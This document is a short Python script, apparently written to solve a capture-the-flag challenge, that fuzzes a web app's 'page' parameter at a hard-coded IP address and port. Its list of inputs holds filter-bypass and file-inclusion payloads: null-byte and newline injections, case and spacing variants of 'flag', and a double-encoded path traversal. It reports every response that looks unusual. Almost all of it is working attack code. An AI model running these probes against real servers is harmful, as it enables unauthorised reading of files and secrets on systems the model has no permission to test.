import urllib.request, urllib.parse

host = "164.92.126.208"
port = 5002

# Try to access files that don't contain 'flag' but might exist
# The app appends .php, so we need filenames that exist as .php files
tests = [
    # Common files that might exist as .php
    "index",
    "test",
    "config",
    "settings",
    "admin",
    "login",
    "secret",
    "hidden",
    "private",
    "debug",
    "error",
    "404",
    "403",
    "500",
    "401",
    "200",
    # Try requesting paths that look for the app source
    "app",
    "main",
    "server",
    "wsgi",
    "run",
    "start",
    "manage",
    # Try with no extension (maybe the app removes .php before reading)
    "home.php",
    "flag.php",
    # Try to see if we can use a different approach
    # What about page names with special chars that might pass through?
    "fla g",
    "fla+g",
    "fla%20g",
    # Try encoding tricks
    "flag%00",
    "fla%00g",
    "fla%0ag",
    # Try case
    "fLaG",
    "FlAg",
    "fLAG",
    # Try alternative flag names  
    "FLAG",
    "FLAG.",
    "Flag",
    "fla",
    "lag",
    "flag.",
    "./flag",
    "..%252f..%252fflag",
]

for test in tests:
    try:
        q = urllib.parse.quote(test, safe="%/=")
        url = f"http://{host}:{port}/?page=" + q
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=5)
        body = resp.read().decode("utf-8", errors="replace")
        if resp.status == 200:
            if len(body) < 500:
                print(f"200: {test} -> Content: {body[:200]}")
            elif "Welcome, Seeker" in body:
                pass  # home page
            elif "Archivist" in body:
                pass  # main page
            else:
                print(f"200: {test} -> UNKNOWN ({len(body)} bytes): {body[:200]}")
        else:
            print(f"??? {test} -> {resp.status}")
    except urllib.error.HTTPError as e:
        pass  # Expected
    except Exception as ex:
        pass

print("Done.")
